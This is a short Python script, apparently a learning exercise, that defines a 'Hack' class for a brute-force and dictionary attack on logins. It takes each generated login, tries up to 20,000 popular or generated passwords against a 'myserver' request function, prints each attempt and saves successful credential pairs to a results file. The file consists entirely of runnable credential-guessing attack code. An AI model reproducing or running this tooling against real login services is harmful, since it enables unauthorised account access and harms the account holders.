from generators import simple_login_generator, popular_password_generator, brute_force_generator
from requesters import myserver

class Hack:

    def __init__(self, login_generator = None, password_generator = None, request = None,
                 limit_passwords_per_login = 100, result_filename = "result.txt"):
        self.login_generator = login_generator
        self.password_generator = password_generator
        self.request = request
        self.limit_passwords_per_login = limit_passwords_per_login
        self.result_filename = result_filename

    def attack(self):
        login_generator = self.login_generator()
        login = login_generator.next()
        while login is not None:
            password_generator = self.password_generator()
            for i in range(self.limit_passwords_per_login):
                password = password_generator.next()
                if password is None:
                    break
                print(f"Trying {login=} {password=}")
                success = self.request(login, password)
                if success:
                    print(f"SUCCESS! {login=} {password=}")
                    with open(self.result_filename, "a") as result_file:
                        result_file.write(f"{login=} {password=}\n")
                    break
                        
            login = login_generator.next()


hack = Hack(login_generator=simple_login_generator.Generator,
            password_generator=popular_password_generator.Generator,
            request=myserver.request,
            limit_passwords_per_login=20000)

hack.attack()